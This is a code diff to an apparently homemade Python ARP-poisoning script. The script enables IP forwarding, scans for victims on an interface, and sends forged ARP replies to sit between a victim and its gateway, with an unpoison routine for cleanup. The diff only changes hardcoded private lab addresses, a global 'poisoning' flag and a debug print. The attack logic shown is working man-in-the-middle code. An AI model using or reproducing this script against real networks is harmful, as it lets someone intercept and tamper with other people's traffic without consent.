@@ -10,6 +10,7 @@ from os import system
 from sys import exit
 from time import sleep
 from click import echo
+
 def enable_ip_forwarding():
 	echo("\n[*] Enabling IP Forwarding...")
 	system("echo 1 > /proc/sys/net/ipv4/ip_forward")
@@ -28,13 +29,15 @@ def unpoison(victim_ip, gw_ip, victim_mac, gw_mac, iface):
 	sendp(Ether(dst=victim_mac)/ARP(op = 2, pdst = victim_ip, psrc = gw_ip, hwdst = victim_mac, hwsrc = gw_mac), iface=iface, verbose=False) #, count = 15)
 #	disable_ip_forwarding()
 
+poisoning = True
+
 def attack(victim_ip):
 	iface = select_iface(victim_ip)
 #	print(iface)
 	try:
 		gw_ip = get_gw(victim_ip)
-#		print(gw_ip)
-		if gw_ip == '0.0.0.0': gw_ip = '192.168.56.104' ######################fix this
+		print(gw_ip)
+		if gw_ip == '0.0.0.0': gw_ip = '192.168.66.42' ######################fix this
 		victims = scan(victim_ip, verbose=0, interface=iface)
 		victims = [ v for v in victims if v[1] != gw_ip]
 		if len(victims) == 0:
@@ -47,7 +50,7 @@ def attack(victim_ip):
 	print(gw_ip, gw_mac)
 	enable_ip_forwarding()
 	echo("[*] Poisoning Targets...")
-	poisoning = True
+	global poisoning
 #	victim_ip='192.168.56.105'
 #	victim_mac='08:00:27:6c:5e:2b'
 	try:
@@ -75,5 +78,5 @@ def attack(victim_ip):
 				unpoison(victim_ip, gw_ip, victim_mac, gw_mac, iface=iface)
 		disable_ip_forwarding()
 
-attack("192.168.56.105")
+attack("192.168.66.36")
 # what if direct link (no gateway) -> choose hosts
